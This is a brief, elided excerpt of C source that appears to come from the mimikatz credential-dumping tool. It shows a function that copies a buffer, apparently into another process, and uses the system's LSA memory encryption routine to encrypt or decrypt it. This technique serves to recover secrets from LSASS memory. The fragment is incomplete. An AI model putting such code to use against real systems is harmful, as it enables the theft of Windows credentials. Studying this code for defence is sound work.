...
NTSTATUS kuhl_m_sekurlsa_nt63_LsaEncryptMemory(IN PVOID Buffer, IN ULONG BufferSize, IN BOOL Encrypt)
{
	...
	{
		((PMANGO_DECRYPTOR) aLocalAddr.address)->cbData = BufferSize;
		RtlCopyMemory(((PMANGO_DECRYPTOR) aLocalAddr.address)->data, Buffer, BufferSize);
				...
				if(NT_SUCCESS(status))
				{
					...
					if(GetExitCodeThread(hThread, &exitCode) && exitCode) // dirty BOOL
						if(kull_m_memory_copy(&aLocalAddr, &aMemoryAddr, totalSize))
							RtlCopyMemory(Buffer, ((PMANGO_DECRYPTOR) aLocalAddr.address)->data, BufferSize);
					CloseHandle(hThread);
				}
